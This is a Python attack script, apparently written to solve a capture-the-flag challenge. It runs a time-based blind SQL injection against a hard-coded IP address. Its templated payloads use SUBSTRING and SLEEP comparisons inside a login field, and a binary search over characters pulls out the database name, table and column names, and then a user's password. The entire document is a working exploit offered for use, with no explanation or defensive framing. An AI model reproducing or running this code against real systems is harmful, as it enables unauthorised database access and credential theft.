import time
import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, digits
import urllib3
from jinja2 import Template


# чтобы не выводила предупреждение
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

arr_simbols = list(digits + ascii_lowercase + "_{}")


headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/80.0.3987.160 Chrome/80.0.3987.163 Safari/537.36'
 }

login_data = {
             'id' : "",
             'submit': "Send"
  }

url = 'http://185.204.109.119:8926/'



template_name_db = Template("1' AND (SELECT IF(SUBSTRING((SELECT database()),{{n_sim}},1)"+
    "{{operator}}'{{simbol}}',SLEEP({{time_sleep}}),SLEEP(0))) -- .")


template_name_table = Template("1' AND (SELECT IF(SUBSTRING("+
            "(SELECT TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = database()"+
                 "LIMIT {{n_row}},1), {{n_sim}}, 1){{operator}}'{{simbol}}', SLEEP({{time_sleep}}), SLEEP(0))) -- .")


template_name_columns = Template("1' AND (SELECT IF(SUBSTRING((SELECT COLUMN_NAME FROM"+
             " information_schema.columns WHERE table_name = 'users' LIMIT {{n_row}}, 1),"+
                  "{{n_sim}}, 1){{operator}}'{{simbol}}', SLEEP({{time_sleep}}), SLEEP(0))) -- .")

"1' AND (SELECT IF(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users' LIMIT 0, 1),1, 1)<'j', SLEEP(5), SLEEP(0))) -- ."


template_flag = Template("1' AND (SELECT IF(SUBSTRING((SELECT password FROM"+
             " users WHERE id=312424),{{n_sim}},1){{operator}}'{{simbol}}',SLEEP({{time_sleep}}),SLEEP(0))) -- .")


def query_generator(template, operator: str, simbol: str, n_sim: int, time_sleep: int, n_row: int) -> str:
    return template.render(operator=operator, simbol=simbol, n_sim=n_sim, time_sleep=time_sleep, n_row=n_row)


def send_request(sql_command: str, expected_time: int) -> bool:
        """ атака по времени """
        login_data['id'] = sql_command

        with requests.Session() as s:

            start = time.perf_counter()
            r = s.post(url, data=login_data, headers=headers)
            end = time.perf_counter()
            # soup = BeautifulSoup(r.text, 'html.parser')

            # print(soup.prettify())
            total_time = end - start
            # print(f"Time: {total_time}")

            if total_time >= expected_time:
                return True
            return False


def binary_search(template, arr: list, n_sim_of_pass: int, expected_time: int, n_row=0):
    low = 0
    high = len(arr) - 1
    while low <= high:
        middle = (low + high) // 2
        if send_request(query_generator(template, "=", arr[middle], n_sim_of_pass, expected_time, n_row), expected_time):
            return arr[middle]
        if send_request(query_generator(template, "<", arr[middle], n_sim_of_pass, expected_time, n_row), expected_time):
            high = middle - 1
        else:
            low = middle + 1
    
    return None


if __name__ == "__main__":
    expected_time = 2


    name_db = ""
    n = 1
    while True:
        unswer = binary_search(template_name_db ,arr_simbols, n, expected_time)
        if unswer is not None:
            name_db += unswer
            print(f"Found half name of DB: {name_db}")
            n += 1
        else:
            break
    

    if len(name_db) == 16:
        print(f"\n\nName of DB found: ({name_db})")
    else:
        print(f"\n\nName of DB not found. It`s half: ({name_db})")

    print("="*100)


    name_table = ""
    n = 1
    while True:
        unswer = binary_search(template_name_table ,arr_simbols, n, expected_time)
        if unswer is not None:
            name_table += unswer
            print(f"Found half name of table: {name_table}")
            n += 1
        else:
            break
    

    if len(name_table) == 5:
        print(f"\n\nName of table found: ({name_table})")
    else:
        print(f"\n\nName of table not found. It`s half: ({name_table})")

    print("="*100)


    arr_columns = []
    for n_row in range(3):
        n_sim = 1
        name_column = ""
        while True:
            unswer = binary_search(template_name_columns ,arr_simbols, n_sim, expected_time, n_row)
            if unswer is not None:
                name_column += unswer
                print(f"Found half name of ncolumn {n_row + 1}: {name_column}")
                n_sim += 1
            else:
                break
    
    
        arr_columns.append(name_column)
        print(f"\n\ncolumn {n_row + 1} found: ({name_column})\n")


    print("="*100)

    flag = ""
    n = 1
    while True:
        unswer = binary_search(template_flag ,arr_simbols, n, expected_time)
        if unswer is not None:
            flag += unswer
            print(f"Found half of flag: {flag}")
            n += 1
        else:
            break
    
    print(f"\n\nflag found: ({flag})")

